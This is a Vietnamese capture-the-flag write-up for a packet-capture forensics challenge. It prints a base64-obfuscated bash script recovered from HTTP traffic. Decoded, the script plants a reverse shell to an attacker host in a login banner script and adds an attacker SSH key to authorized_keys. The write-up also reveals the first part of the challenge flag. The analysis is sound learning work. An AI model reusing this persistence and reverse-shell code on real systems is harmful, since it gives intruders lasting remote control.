# _REDTRAILS_
Lần này thử thách ở mức medium và flag được chia làm 3 phần
![image](https://github.com/user-attachments/assets/3580497d-6464-4fe6-a50a-cbbee1645a3b)

Tải về tệp zip, giải nén ta có được 1 file .pcapng, mình dùng wireshark để phân tích

![image](https://github.com/user-attachments/assets/9a9a2e07-9448-4f0b-aee3-7464ec81b8af)

Mở ra thì mình thấy có 2 giao thức quen thuộc là **TCP**, **HTTP** và 1 giao thức lần đầu mình gặp là **RESP**

![image](https://github.com/user-attachments/assets/4591df69-e5f7-4042-a6c2-69845dab820e)

Khi mình gặp **HTTP** thì mình thường dùng **export object HTTP** 

![image](https://github.com/user-attachments/assets/edfc54b5-1f16-457c-96f3-fa950caa3cc1)

Follow HTTP stream của packet đó ta được một đoạn hội thoại giữa client và server như sau

![image](https://github.com/user-attachments/assets/30c631b4-966e-4b88-b92e-1b084bfa81de)

Nhìn cũng chả hiểu gì nhưng mình thấy 1 đoạn mã rất giống base64 nhưng bị viết ngược, mình thử convert lại bằng python

![image](https://github.com/user-attachments/assets/676810c5-0bff-423c-8679-b2f59c6ecd57)

Lấy đoạn mã đó ném lên cyberchef from base64, ta được

```
#!/bin/bash

lhJVXukWibAFfkv() {
	ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
	QOPjH='jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'
	gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
    echo "$ABvnz$QOPjH$gQIxX" | base64 --decode | bash
}

x7KG0bvubT6dID2() {
	LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"
	gVR7i="M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"
	bkzHk="bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"
	q97up="ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"
	GYJan="bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"
	HJj6A="UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"
	fD9Kc="R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"
	hpAgs="SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"
	FqOPN="emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"
	CpJLT="Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"
	PIx1p="cw=="
	echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 --decode | bash
}

hL8FbEfp9L1261G() {
	lhJVXukWibAFfkv
	x7KG0bvubT6dID2
}

hL8FbEfp9L1261G
```
Theo ý hiểu của mình thì đây là một đoạn mã Bash bao gồm một tập hợp các hàm mã hóa bằng Base64, giải mã và thực thi mã đã giải bằng lệnh Bash. Nhìn thấy base64 khá ngứa tay nên viết 1 đoạn python để nối tất cả chúng lại

```
import base64

base64_strings = [
"ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R",
"jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9",
"ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK",
"ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL",
"M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52",
"bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH",
"ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s",
"bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK",
"UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr",
"R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3",
"SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp",
"emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw",
"Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5",
"cw==",
"lhJVXukWibAFfkv",
"x7KG0bvubT6dID2",

]
combined_base64 = "".join(base64_strings)
decoded_bytes = base64.b64decode(combined_base64)
decoded_string = decoded_bytes.decode('utf-8')
print(decoded_string)
```
Giải mã ta được 1 thứ gì đó..

![image](https://github.com/user-attachments/assets/96bbb608-cf11-4e11-a343-9405c40c1e5f)

Nhưng lấy dược part 1 của flag
```
HTB{r3d15_1n574nc35"
```




